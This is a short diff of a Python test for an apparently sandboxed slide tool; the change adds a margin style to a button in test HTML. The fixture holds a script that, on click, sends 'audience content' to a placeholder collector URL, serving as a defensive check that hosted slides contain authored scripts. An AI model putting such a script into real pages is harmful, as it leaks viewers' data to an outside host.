@@ -308,7 +308,8 @@ def test_hosted_audience_keeps_authored_scripts_behind_offline_parent(
             digest(slide.model_dump_json()),
             "hosted-offline-slide",
             SlidePatch(
-                interactive_html="""<button id="attempt">Attempt navigation</button>
+                interactive_html="""<button id="attempt" style="margin: 150px">
+            Attempt navigation</button>
             <script>document.querySelector('#attempt').onclick=()=>location.replace(
               'https://collector.example.test/leak?data=FICTIONAL_AUDIENCE_CONTENT');</script>"""
             ),
